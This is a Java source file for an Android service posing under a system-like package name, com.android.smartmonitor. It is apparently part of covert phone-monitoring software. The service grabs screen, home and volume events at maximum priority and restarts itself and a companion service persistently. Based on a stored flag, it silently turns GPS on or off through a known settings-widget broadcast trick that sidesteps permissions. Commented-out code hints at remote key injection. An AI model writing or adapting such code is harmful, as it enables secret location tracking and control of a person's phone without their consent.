package com.android.smartmonitor.control;

import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;
import com.android.smartmonitor.receiver.CheckHomeReceiver;
import com.android.smartmonitor.receiver.CheckScreenOffReceiver;
import com.android.smartmonitor.receiver.CheckScreenOnReceiver;
import com.android.smartmonitor.receiver.CheckVolumeReceiver;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class MonitorService extends Service implements Runnable {
	private Thread m_thread = null;
	private boolean m_shouldExit = true;

	//private CheckPower m_wifiPower;

	private CheckScreenOffReceiver m_screenOffReceiver = null;
	private CheckScreenOnReceiver m_screenOnReceiver = null;
	private CheckHomeReceiver m_homeReceiver = null;
	private CheckVolumeReceiver m_volumeReceiver = null;

	@Override
	public void onCreate() {
		// WifiGlobal.wifiLog("WifiServiceMonitor onCreate");

		super.onCreate();

		this.m_screenOffReceiver = null;
		this.m_screenOnReceiver = null;
		this.m_volumeReceiver = null;
		this.m_homeReceiver = null;

		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telManager.listen(new PhoneStateListener() {
			public void onCallForwardingIndicatorChanged(boolean cfi) {
				new Thread(new Runnable() {
					public void run() {
						try {
							Thread.sleep(1000);
							//
							// WifiIONative.initInput();
							// Thread.sleep(300);
							//
							// WifiIONative.keyDown(0xff1b);
							// Thread.sleep(150);
							// WifiIONative.keyUp(0xff1b);
							// Thread.sleep(300);
							// WifiIONative.keyDown(0xff1b);
							// Thread.sleep(150);
							// WifiIONative.keyUp(0xff1b);
							//
							// Thread.sleep(300);
							// WifiIONative.cleanupInput();

							// WifiIONative.clearFBStop();
						} catch (Exception e) {

						}
					}
				}).start();
			}
		}, PhoneStateListener.LISTEN_CALL_FORWARDING_INDICATOR);

		this.m_screenOffReceiver = new CheckScreenOffReceiver();
		IntentFilter screenOffIF = new IntentFilter(
				"android.intent.action.SCREEN_OFF");
		screenOffIF.setPriority(2147483647);
		registerReceiver(this.m_screenOffReceiver, screenOffIF);

		this.m_screenOnReceiver = new CheckScreenOnReceiver();
		IntentFilter screenOnIF = new IntentFilter(
				"android.intent.action.SCREEN_ON");
		screenOnIF.setPriority(2147483647);
		registerReceiver(this.m_screenOnReceiver, screenOnIF);

		this.m_homeReceiver = new CheckHomeReceiver();
		IntentFilter homeIF = new IntentFilter("android.intent.category.HOME");
		homeIF.setPriority(2147483647);
		registerReceiver(this.m_homeReceiver, homeIF);

		this.m_volumeReceiver = new CheckVolumeReceiver();
		IntentFilter volumeIF = new IntentFilter(
				"android.media.VOLUME_CHANGED_ACTION");
		volumeIF.setPriority(2147483647);
		registerReceiver(this.m_volumeReceiver, volumeIF);

		//m_wifiPower = new CheckPower(this);

		m_thread = null;

		m_shouldExit = false;

		// m_wifiPower.wakeLock();
		// m_wifiPower.wifiLock();

		m_thread = new Thread(this);
		m_thread.start();
	}

	@Override
	public void onDestroy() {
		// WifiGlobal.wifiLog("WifiServiceMonitor onDestroy");

		if (this.m_screenOffReceiver != null)
			unregisterReceiver(this.m_screenOffReceiver);
		if (this.m_screenOnReceiver != null)
			unregisterReceiver(this.m_screenOnReceiver);
		if (this.m_homeReceiver != null)
			unregisterReceiver(this.m_homeReceiver);

		//m_wifiPower.wifiRelease();
		//m_wifiPower.wakeRelease();

		m_shouldExit = true;
		m_thread.interrupt();
		m_thread = null;

		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// WifiGlobal.wifiLog("WifiServiceMonitor onStartCommand");

		super.onStartCommand(intent, flags, startId);
		return START_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	public void run() {
		boolean isServiceRunning = false;
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		Intent localIntent;

		while (!m_shouldExit) {
			try {

				SharedPreferences localSharedPreferences = getSharedPreferences(
						"d", 0);
				int gpsFlag = localSharedPreferences.getInt("gpsFlag", -1);
				if (gpsFlag == 1) {
					// enableGPS(true);
					toggleGPS(true);
				} else {
					// enableGPS(false);
					toggleGPS(false);
				}

				for (RunningServiceInfo service : manager
						.getRunningServices(Integer.MAX_VALUE)) {
					if (CheckRunning.class.getName().equals(
							service.service.getClassName())) {
						isServiceRunning = true;
						break;
					}
				}

				if (isServiceRunning == false) {
					localIntent = new Intent(this.getBaseContext(),
							CheckRunning.class);
					this.getBaseContext().startService(localIntent);
				}

				Thread.sleep(CheckGlobal.g_serviceInterval);
			} catch (Exception e) {
			}
		}
	}

	private void toggleGPS(boolean enable) {
		String provider = Settings.Secure.getString(getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

		if (provider.contains("gps") == enable) {
			return; // the GPS is already in the requested state
		}

		final Intent poke = new Intent();
		poke.setClassName("com.android.settings",
				"com.android.settings.widget.SettingsAppWidgetProvider");
		poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
		poke.setData(Uri.parse("custom:3")); // SET 3 for gps,3 for bluthooth
		sendBroadcast(poke);
	}

	private void enableGPS(boolean enable) {
		Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
		intent.putExtra("enabled", enable);
		sendBroadcast(intent);
	}
}
